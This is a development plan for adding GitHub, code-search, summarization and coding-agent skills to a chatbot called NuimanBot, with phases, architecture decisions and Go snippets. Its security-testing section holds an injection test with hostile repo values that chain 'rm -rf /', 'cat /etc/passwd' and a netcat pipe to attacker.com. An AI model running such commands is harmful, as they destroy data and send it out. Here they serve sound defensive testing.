# Developer Productivity Skills - Implementation Plan

**Feature Suite:** Developer Productivity Skills (Phase 5)
**Version:** 1.0
**Created:** 2026-02-07
**Status:** Planning

---

## Table of Contents

1. [Implementation Overview](#implementation-overview)
2. [Phased Delivery](#phased-delivery)
3. [Parallel Work Streams](#parallel-work-streams)
4. [Architecture Decisions](#architecture-decisions)
5. [Critical Path Analysis](#critical-path-analysis)
6. [Testing Strategy](#testing-strategy)
7. [Risk Mitigation](#risk-mitigation)
8. [Success Criteria](#success-criteria)

---

## Implementation Overview

### Approach

This implementation follows Clean Architecture TDD principles with parallel work streams for maximum efficiency:

1. **Foundation-First:** Build shared infrastructure (ExecutorService, RateLimiter) before individual skills
2. **Parallel Skill Development:** Each skill developed independently by separate subagents
3. **Incremental Integration:** Skills integrated and tested one at a time
4. **Security-Integrated:** Security controls built into each skill from day one

### Timeline Estimate

| Phase | Duration | Parallelization | Dependencies |
|-------|----------|----------------|--------------|
| Phase 1: Foundation | 3-5 days | Limited (1-2 agents) | None |
| Phase 2: Core Skills | 5-7 days | High (5 agents) | Phase 1 complete |
| Phase 3: Integration | 2-3 days | Medium (2-3 agents) | Phase 2 complete |
| Phase 4: E2E Testing | 2-3 days | Medium (2-3 agents) | Phase 3 complete |
| **Total** | **12-18 days** | | |

---

## Phased Delivery

### Phase 1: Foundation Infrastructure (3-5 days)

**Goal:** Build shared infrastructure for all skills

**Deliverables:**
1. `ExecutorService` - Command execution with timeout, PTY mode, background sessions
2. `RateLimiter` - Per-skill, per-user rate limiting
3. `OutputSanitizer` - Secret redaction, sensitive pattern detection
4. `PathValidator` - Workspace restriction, path traversal prevention
5. Base test utilities for skill testing

**Critical Files:**
- `internal/usecase/skill/executor/service.go`
- `internal/usecase/skill/executor/service_test.go`
- `internal/usecase/skill/common/ratelimiter.go`
- `internal/usecase/skill/common/sanitizer.go`
- `internal/usecase/skill/common/validator.go`

**Acceptance Criteria:**
- [ ] ExecutorService passes all unit tests (timeout, error handling, PTY mode)
- [ ] RateLimiter correctly enforces limits (tested with concurrent requests)
- [ ] OutputSanitizer redacts known secret patterns
- [ ] PathValidator rejects path traversal attempts
- [ ] 90%+ test coverage for all foundation components

**Assigned To:** Foundation Agent (subagent 1)

---

### Phase 2: Core Skills Development (5-7 days, Parallel)

**Goal:** Implement all five skills in parallel

**Work Streams:**

#### Stream 2A: GitHubSkill (Agent 2)

**Deliverables:**
- `internal/usecase/skill/github/skill.go`
- `internal/usecase/skill/github/skill_test.go`
- `internal/usecase/skill/github/types.go`
- `internal/usecase/skill/github/parser.go` (parse gh CLI JSON output)

**Complexity:** Medium (command construction, JSON parsing)
**Estimated Duration:** 5 days

**Acceptance Criteria:**
- [ ] Implements all 12 GitHub actions (issue_*, pr_*, repo_*, workflow_*)
- [ ] Validates repo format (owner/repo pattern)
- [ ] Parses `gh` CLI JSON output correctly
- [ ] Handles `gh` command failures gracefully
- [ ] Rate limits enforced (30 ops/min per user)
- [ ] 90%+ test coverage

#### Stream 2B: RepoSearchSkill (Agent 3)

**Deliverables:**
- `internal/usecase/skill/reposearch/skill.go`
- `internal/usecase/skill/reposearch/skill_test.go`
- `internal/usecase/skill/reposearch/parser.go` (parse ripgrep JSON output)

**Complexity:** Low (simple command execution, JSON parsing)
**Estimated Duration:** 3 days

**Acceptance Criteria:**
- [ ] Searches with query, path, file_type, max_results, context_lines
- [ ] Validates path against allowed directories
- [ ] Parses ripgrep JSON output correctly
- [ ] Completes searches in <2s for typical repos
- [ ] 90%+ test coverage

#### Stream 2C: DocSummarizeSkill (Agent 4)

**Deliverables:**
- `internal/usecase/skill/docsummarize/skill.go`
- `internal/usecase/skill/docsummarize/skill_test.go`
- `internal/usecase/skill/docsummarize/fetcher.go` (fetch from file/git/http)
- `internal/usecase/skill/docsummarize/summarizer.go` (LLM summarization)

**Complexity:** Medium (multiple source types, LLM integration)
**Estimated Duration:** 5 days

**Acceptance Criteria:**
- [ ] Supports file, git, http sources
- [ ] Validates domain allowlist for http sources
- [ ] Enforces file size limits (5MB max)
- [ ] Generates summaries via LLM provider
- [ ] Extracts key topics from summary
- [ ] Rate limits enforced (10 summaries/hour per user)
- [ ] 85%+ test coverage (mocked LLM calls)

#### Stream 2D: SummarizeSkill (Agent 5)

**Deliverables:**
- `internal/usecase/skill/summarize/skill.go`
- `internal/usecase/skill/summarize/skill_test.go`
- `internal/usecase/skill/summarize/extractor.go` (HTML content extraction)
- `internal/usecase/skill/summarize/youtube.go` (YouTube transcript extraction)
- `internal/usecase/skill/summarize/summarizer.go` (LLM summarization)

**Complexity:** High (web scraping, YouTube API/yt-dlp, LLM integration)
**Estimated Duration:** 7 days

**Acceptance Criteria:**
- [ ] Supports HTTP/HTTPS URLs, YouTube videos
- [ ] Extracts main content from HTML (removes nav, ads, scripts)
- [ ] Extracts YouTube transcripts via yt-dlp
- [ ] Generates summaries in brief/detailed/bullet_points formats
- [ ] Optionally includes key quotes from source
- [ ] Rate limits enforced (20 summaries/hour per user)
- [ ] 85%+ test coverage (mocked HTTP and YouTube responses)

#### Stream 2E: CodingAgentSkill (Agent 6)

**Deliverables:**
- `internal/usecase/skill/codingagent/skill.go`
- `internal/usecase/skill/codingagent/skill_test.go`
- `internal/usecase/skill/codingagent/session.go` (session management)
- `internal/usecase/skill/codingagent/executor.go` (PTY-based execution)

**Complexity:** High (PTY mode, background sessions, approval workflow)
**Estimated Duration:** 7 days

**Acceptance Criteria:**
- [ ] Supports codex, claude_code, opencode, gemini, copilot tools
- [ ] Executes in PTY mode for interactive CLIs
- [ ] Manages background sessions for long tasks
- [ ] Implements approval workflow (interactive mode)
- [ ] Validates workspace restrictions
- [ ] Admin-only permission enforced
- [ ] 85%+ test coverage (mocked CLI interactions)

**Dependencies Between Streams:**
- All streams depend on Phase 1 (Foundation) completion
- No dependencies between streams 2A-2E (fully parallel)

---

### Phase 3: Integration and Configuration (2-3 days)

**Goal:** Integrate all skills into NuimanBot skill registry

**Deliverables:**
1. Skill registry updates (`cmd/nuimanbot/main.go`)
2. Configuration schema updates (`config.yaml`)
3. Documentation updates (`README.md`, `technical-details.md`)
4. Integration tests for skill registry

**Tasks:**
- Register all 5 skills in SkillRegistry
- Add configuration entries to `config.yaml`
- Update `README.md` with new skill documentation
- Update `technical-details.md` with architecture details
- Create integration tests for skill loading and execution

**Acceptance Criteria:**
- [ ] All 5 skills load successfully from configuration
- [ ] Skills accessible via LLM tool calling
- [ ] Configuration validates correctly
- [ ] Documentation complete and accurate
- [ ] Integration tests pass

**Assigned To:** Integration Agent (subagent 7)

---

### Phase 4: End-to-End Testing (2-3 days, Parallel)

**Goal:** Validate full workflows across all gateways

**Work Streams:**

#### Stream 4A: CLI Gateway Testing (Agent 8)

**Scenarios:**
- User lists GitHub issues via CLI
- User searches codebase via CLI
- User summarizes URL via CLI
- Admin runs coding agent task via CLI

**Acceptance Criteria:**
- [ ] All scenarios complete successfully
- [ ] Error messages are clear and actionable
- [ ] Rate limiting works as expected
- [ ] Audit events logged correctly

#### Stream 4B: Telegram Gateway Testing (Agent 9)

**Scenarios:**
- User creates GitHub PR via Telegram
- User searches docs via Telegram
- User summarizes YouTube video via Telegram

**Acceptance Criteria:**
- [ ] All scenarios complete successfully
- [ ] Responses formatted correctly for Telegram
- [ ] Markdown rendering works
- [ ] Permission denials handled gracefully

#### Stream 4C: Security Testing (Agent 10)

**Scenarios:**
- Command injection attempts (github, coding_agent skills)
- Path traversal attempts (repo_search skill)
- Domain allowlist bypass (summarize, doc_summarize skills)
- Rate limit evasion attempts
- Privilege escalation attempts (user accessing admin-only skills)

**Acceptance Criteria:**
- [ ] All injection attempts blocked
- [ ] Path traversal prevented
- [ ] Domain allowlist enforced
- [ ] Rate limits cannot be bypassed
- [ ] RBAC enforced correctly
- [ ] All attempts logged to audit log

---

## Parallel Work Streams

### Maximizing Parallelization

**Phase 1 (Foundation):** Limited parallelization
- 1-2 agents working on shared infrastructure
- Some components can be developed in parallel (e.g., RateLimiter and OutputSanitizer)

**Phase 2 (Skills):** Maximum parallelization
- 5 agents working independently on 5 skills
- Each skill is self-contained with clear interfaces
- Minimal inter-skill dependencies

**Phase 3 (Integration):** Medium parallelization
- 1-2 agents for integration work
- Some parallel work possible (config vs documentation)

**Phase 4 (Testing):** Medium parallelization
- 3 agents for different testing streams
- Each stream tests different aspects (CLI, Telegram, Security)

### Subagent Assignment Strategy

| Subagent | Role | Workload | Complexity |
|----------|------|----------|------------|
| Agent 1 | Foundation Infrastructure | High | High |
| Agent 2 | GitHubSkill | Medium | Medium |
| Agent 3 | RepoSearchSkill | Low | Low |
| Agent 4 | DocSummarizeSkill | Medium | Medium |
| Agent 5 | SummarizeSkill | High | High |
| Agent 6 | CodingAgentSkill | High | High |
| Agent 7 | Integration | Medium | Medium |
| Agent 8 | CLI Testing | Medium | Low |
| Agent 9 | Telegram Testing | Medium | Low |
| Agent 10 | Security Testing | High | High |

**Total Agent-Days:** ~60-70 days of work, parallelized to 12-18 calendar days

---

## Architecture Decisions

### AD-1: Command Execution Abstraction

**Decision:** Create a dedicated `ExecutorService` for all command execution

**Rationale:**
- Centralized timeout enforcement
- Consistent error handling and logging
- Easier testing with mock executor
- Security controls in one place (command validation, output sanitization)

**Alternatives Considered:**
- Direct `exec.Command()` calls in each skill
  - **Rejected:** Too much duplication, harder to test

**Implementation:**
```go
// ExecutorService interface
type ExecutorService interface {
    Execute(ctx context.Context, req ExecutionRequest) (*ExecutionResult, error)
    ExecuteBackground(ctx context.Context, req ExecutionRequest) (*BackgroundSession, error)
}

// Used by all skills
result, err := s.execSvc.Execute(ctx, ExecutionRequest{
    Command: "gh",
    Args:    []string{"issue", "list", "--repo", repo},
    Timeout: 30 * time.Second,
})
```

---

### AD-2: Rate Limiting Strategy

**Decision:** Per-skill, per-user rate limiting with configurable limits

**Rationale:**
- Different skills have different cost profiles (GitHub API limits vs local ripgrep)
- Users should not be penalized for using one skill heavily when others are idle
- Admins can tune limits based on observed usage patterns

**Alternatives Considered:**
- Global rate limit across all skills
  - **Rejected:** Too restrictive, doesn't account for skill cost differences
- No rate limiting
  - **Rejected:** Risk of abuse, resource exhaustion

**Implementation:**
```go
// Per-skill configuration
skills:
  entries:
    github:
      params:
        rate_limit: "30/minute"  # 30 ops per minute
    summarize:
      params:
        rate_limit: "20/hour"    # 20 ops per hour (expensive LLM calls)
```

---

### AD-3: Background Session Management

**Decision:** Use in-memory session storage with periodic cleanup

**Rationale:**
- Simplifies implementation (no database schema changes)
- Sessions are ephemeral (typically 5-30 minutes)
- Session state not critical (can be recreated if process restarts)

**Alternatives Considered:**
- Database-backed session storage
  - **Rejected:** Overkill for ephemeral sessions, adds complexity
- No background sessions (synchronous only)
  - **Rejected:** Poor UX for long-running coding agent tasks

**Implementation:**
```go
// In-memory session manager
type SessionManager struct {
    sessions map[string]*CodingAgentSession
    mu       sync.RWMutex
}

// Periodic cleanup of completed sessions (every 15 minutes)
func (m *SessionManager) cleanupStale() {
    for id, session := range m.sessions {
        if session.IsStale(30 * time.Minute) {
            delete(m.sessions, id)
        }
    }
}
```

---

### AD-4: LLM Provider for Summarization

**Decision:** Use user's configured primary LLM provider

**Rationale:**
- Consistent user experience (same model quality across skills)
- No additional API keys required
- Leverages existing LLM abstraction layer

**Alternatives Considered:**
- Dedicated summarization provider (e.g., always use Claude)
  - **Rejected:** Inflexible, requires separate API key
- User-selectable per skill
  - **Rejected:** Too complex for MVP, can add later if needed

**Implementation:**
```go
// Use existing LLMService from usecase layer
summary, err := s.llmSvc.Complete(ctx, domain.LLMRequest{
    Model:    userPreferences.Model,  // User's preferred model
    Messages: []domain.Message{
        {Role: "user", Content: "Summarize this document: " + content},
    },
})
```

---

### AD-5: YouTube Transcript Extraction

**Decision:** Start with yt-dlp, add YouTube API as fallback in future

**Rationale:**
- yt-dlp works without API key (easier setup)
- yt-dlp supports auto-generated and manual subtitles
- YouTube API has quota limits (10,000 units/day default)

**Alternatives Considered:**
- YouTube API only
  - **Rejected:** Requires API key, quota limits
- Both yt-dlp and YouTube API in MVP
  - **Rejected:** Increased complexity, diminishing returns

**Implementation:**
```go
// yt-dlp command
ytdlp --write-auto-sub --sub-lang en --skip-download --sub-format txt <video-url>

// Future: Add YouTube API fallback if yt-dlp fails
```

---

### AD-6: PTY Mode for Interactive CLIs

**Decision:** Support PTY mode in ExecutorService for interactive CLIs

**Rationale:**
- Required for Claude Code, Codex, and other interactive CLIs
- Prevents CLI hangs when expecting terminal input
- Enables background sessions with log tailing

**Alternatives Considered:**
- Non-PTY mode only
  - **Rejected:** Breaks interactive CLIs (hangs, corrupted output)

**Implementation:**
```go
// Use github.com/creack/pty for PTY support
import "github.com/creack/pty"

if req.PTYMode {
    cmd := exec.Command(req.Command, req.Args...)
    ptyFile, err := pty.Start(cmd)
    // Read from ptyFile for output
}
```

---

## Critical Path Analysis

### Critical Path: Foundation → Core Skills → Integration → Testing

**Phase 1: Foundation (Critical)**
- All subsequent work depends on foundation completion
- No parallelization possible in early stages
- **Mitigation:** Prioritize ExecutorService and RateLimiter first

**Phase 2: Core Skills (Parallelizable)**
- All 5 skills can be developed in parallel
- No critical path within this phase
- **Optimization:** Assign simpler skills (RepoSearchSkill) to complete first, providing early wins

**Phase 3: Integration (Semi-Critical)**
- Depends on all skills completing Phase 2
- Some tasks can run in parallel (config vs documentation)
- **Mitigation:** Begin integration planning during Phase 2

**Phase 4: Testing (Parallelizable)**
- E2E testing can run in parallel across gateways
- Security testing can run independently
- **Optimization:** Start E2E tests as soon as each skill is integrated

### Bottlenecks and Mitigation

| Bottleneck | Impact | Mitigation |
|------------|--------|------------|
| Foundation delays | Blocks all skills | Allocate experienced developer to Agent 1 |
| Complex skills delay (Summarize, CodingAgent) | Delays integration | Start integration with completed skills (incremental) |
| External tool availability | Blocks testing | Use mock commands for unit tests, real tools for E2E only |
| LLM provider rate limits | Slows summarization testing | Use cached responses for tests, limit E2E test volume |

---

## Testing Strategy

### Unit Testing (Per Skill)

**Coverage Target:** 90%+

**Approach:**
- Mock ExecutorService for command execution
- Mock LLMService for summarization
- Test input validation with valid/invalid/edge cases
- Test error handling for all failure modes
- Test rate limiting with concurrent requests

**Example:**
```go
func TestGitHubSkill_Execute_IssueList(t *testing.T) {
    mockExec := &mockExecutor{
        response: `[{"number":1,"title":"Bug","state":"open"}]`,
    }
    skill := NewGitHubSkill(config, mockExec)

    result, err := skill.Execute(ctx, map[string]any{
        "action": "issue_list",
        "repo":   "owner/repo",
    })

    require.NoError(t, err)
    assert.Contains(t, result.Output, "Bug")
}
```

---

### Integration Testing (Cross-Component)

**Coverage Target:** Key workflows

**Approach:**
- Test skill registration and loading
- Test skill execution through SkillRegistry
- Test permission enforcement (RBAC)
- Test audit logging
- Use real ExecutorService with mock commands (shell scripts)

**Example:**
```go
func TestSkillRegistry_ExecuteGitHubSkill(t *testing.T) {
    registry := NewSkillRegistry()
    registry.Register(NewGitHubSkill(...))

    result, err := registry.Execute(ctx, "github", map[string]any{
        "action": "issue_list",
        "repo":   "owner/repo",
    })

    require.NoError(t, err)
    // Verify result
}
```

---

### E2E Testing (Full Stack)

**Coverage Target:** User stories

**Approach:**
- Test full message flow: Gateway → Chat Service → Skill → LLM → Response
- Use real external tools (gh, rg, yt-dlp) in controlled environment
- Test across all gateways (CLI, Telegram, Slack)
- Manual verification for complex workflows (coding_agent)

**Example:**
```
Scenario: User lists GitHub issues via Telegram
Given: User is authenticated via Telegram
When: User sends "List open issues in myorg/myrepo"
Then: NuimanBot responds with formatted issue list
And: Message is logged to conversation history
And: Audit event is logged
```

---

### Security Testing

**Coverage Target:** All threat model scenarios

**Approach:**
- Automated injection attack tests (command injection, path traversal)
- Fuzz testing for input validation
- Permission escalation tests (user accessing admin skills)
- Rate limit evasion tests
- Secret exposure tests (scan outputs for patterns)

**Example:**
```go
func TestGitHubSkill_CommandInjection(t *testing.T) {
    skill := NewGitHubSkill(config, execSvc)

    maliciousInputs := []string{
        "owner/repo; rm -rf /",
        "owner/repo && cat /etc/passwd",
        "owner/repo | nc attacker.com 4444",
    }

    for _, input := range maliciousInputs {
        _, err := skill.Execute(ctx, map[string]any{
            "action": "issue_list",
            "repo":   input,
        })

        assert.Error(t, err, "should reject malicious input")
        assert.Contains(t, err.Error(), "invalid repo format")
    }
}
```

---

## Risk Mitigation

### Risk 1: External Tool Dependencies

**Scenario:** gh CLI, ripgrep, yt-dlp not installed or wrong version

**Impact:** Skills fail at runtime with cryptic errors

**Mitigation:**
- Document required tools and versions in README
- Add tool version checks on skill initialization
- Provide clear error messages if tool missing
- Include installation instructions in error message

**Implementation:**
```go
func (s *GitHubSkill) Initialize() error {
    // Check gh CLI is installed and version
    cmd := exec.Command("gh", "version")
    output, err := cmd.CombinedOutput()
    if err != nil {
        return fmt.Errorf("gh CLI not found. Install from https://cli.github.com")
    }

    // Parse version and check minimum
    version := parseVersion(output)
    if version.LessThan("2.0.0") {
        return fmt.Errorf("gh CLI version %s is too old (minimum: 2.0.0)", version)
    }

    return nil
}
```

---

### Risk 2: GitHub CLI Authentication

**Scenario:** User hasn't run `gh auth login`, skills fail with auth errors

**Impact:** GitHub skills unusable until manual authentication

**Mitigation:**
- Check `gh auth status` on skill initialization
- Provide clear instructions to run `gh auth login`
- Document authentication requirement in README
- Consider adding interactive auth prompt (future enhancement)

**Implementation:**
```go
func (s *GitHubSkill) checkAuth() error {
    cmd := exec.Command("gh", "auth", "status")
    if err := cmd.Run(); err != nil {
        return fmt.Errorf("GitHub CLI not authenticated. Run: gh auth login")
    }
    return nil
}
```

---

### Risk 3: LLM Provider Rate Limits

**Scenario:** Summarization skills hit LLM provider rate limits

**Impact:** Summarization requests fail with 429 errors

**Mitigation:**
- Implement exponential backoff retry
- Respect provider rate limit headers
- Use fallback providers if primary fails
- Cache summaries to reduce LLM calls

**Implementation:**
```go
// Use existing multi-provider fallback from MVP
result, err := s.llmSvc.Complete(ctx, req)
if err != nil && isRateLimitError(err) {
    // LLMService automatically tries fallback providers
    // If all fail, return error to user with retry suggestion
    return fmt.Errorf("LLM rate limit exceeded, please try again in a few minutes")
}
```

---

### Risk 4: Coding Agent Safety

**Scenario:** Coding agent makes unintended changes outside workspace

**Impact:** Data loss, system compromise

**Mitigation:**
- Enforce workspace restriction (validate working directory)
- Require git repository (prevents scratch tasks in random directories)
- Default to interactive mode (approval required)
- Admin-only permission by default
- Comprehensive audit logging

**Implementation:**
```go
// Validate workspace
if !strings.HasPrefix(workingDir, allowedWorkspace) {
    return fmt.Errorf("working directory outside allowed workspace")
}

// Require git repo
if !isGitRepo(workingDir) {
    return fmt.Errorf("coding agent requires a git repository")
}

// Log all operations
auditLogger.Log(AuditEvent{
    Action:   "coding_agent_execute",
    UserID:   userID,
    Metadata: map[string]any{"tool": tool, "task": task, "mode": mode},
})
```

---

## Success Criteria

### Functional Success

- [ ] All 5 skills implement Skill interface correctly
- [ ] All skills pass unit tests (90%+ coverage)
- [ ] All skills pass integration tests
- [ ] All skills accessible via LLM tool calling
- [ ] All user stories validated via E2E tests
- [ ] All skills documented in README and technical-details.md

### Performance Success

- [ ] repo_search completes in <2s for typical repos
- [ ] github skill operations complete in <5s (excluding API latency)
- [ ] doc_summarize completes within 60s timeout
- [ ] summarize completes within 90s timeout
- [ ] coding_agent supports background sessions for long tasks

### Security Success

- [ ] All security tests pass (injection, traversal, privilege escalation)
- [ ] All skills enforce RBAC correctly
- [ ] All skills log audit events
- [ ] Rate limiting prevents abuse
- [ ] Output sanitization removes secrets
- [ ] No security regressions from MVP

### Quality Success

- [ ] All quality gates pass (fmt, tidy, vet, lint, test, build)
- [ ] No golangci-lint errors
- [ ] Test coverage ≥85% for all skills
- [ ] All code reviewed and approved
- [ ] Documentation complete and accurate

---

**Plan Complete:** Ready to proceed to `tasks.md` for detailed task breakdown.
